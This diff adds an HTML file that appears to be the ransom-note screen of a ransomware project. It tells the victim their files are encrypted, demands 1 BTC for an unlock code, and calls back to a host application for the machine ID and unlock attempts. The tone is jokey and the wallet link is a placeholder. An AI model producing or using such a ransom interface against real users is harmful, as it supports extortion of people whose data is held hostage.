@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+    <script>
+        function attemptUnlock() {
+            external.invoke('attempt_unlock');
+        }
+
+        function showUnlockResults(result) {
+            document.querySelector('#results').textContent = result;
+        }
+
+        function renderMachineInfo(machineId) {
+            document.querySelector('#machine_id').textContent = machineId;
+        }
+    </script>
+    <style>
+        body {
+            font-family: monospace;
+            color: lightskyblue;
+            background-color: darkblue;
+        }
+
+        a {
+            color: hotpink;
+        }
+
+        #unlock_code {
+            background-color: darkblue;
+            border: 2px solid lightskyblue;
+            color: lightskyblue;
+            font-family: monospace;
+        }
+
+        #results {
+            text-align: center;
+        }
+
+        #attempt {
+            margin-top: 2rem;
+            cursor: pointer;
+            background-image: repeating-linear-gradient(45deg, violet, indigo, blue, green, yellow, orange, red, violet);
+            text-align: center;
+            background-size: 800% 800%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-size: 24px;
+            animation: rainbow 8s ease infinite;
+        }
+
+        @keyframes rainbow {
+            0% {
+                background-position: 0% 50%
+            }
+            50% {
+                background-position: 100% 25%
+            }
+            100% {
+                background-position: 0% 50%
+            }
+        }
+    </style>
+</head>
+<body>
+<h1>
+    <marquee>O shit boi</marquee>
+</h1>
+
+<h3>Your files are ✨encrypted✨</h3>
+<p>Here's how what you need to do to get them back:</p>
+<ol>
+    <li>Get some mf <a href="https://bitcoin.org/en/buy">BitCoin</a></li>
+    <li>Send 1 BTC <a href="#">to my wallet</a></li>
+    <li>You'll get a sexy text back</li>
+    <li>Paste it below</li>
+</ol>
+
+<p>Pro tip: You're poor? Let us know at <a href="mailto:fake@u.gay">fake@u.gay</a> and we'll send the code for cheap.
+</p>
+<div>
+    Machine ID: <span id="machine_id"></span>
+    <br/>
+    <label for="unlock_code">Unlock Code:</label>
+    <input type="text" id="unlock_code">
+    <div id="attempt" onclick="attemptUnlock()">Yeah boah clickehme</div>
+</div>
+<p id="results"></p>
+<script>
+    external.invoke('render_machine_info');
+</script>
+</body>
+</html>
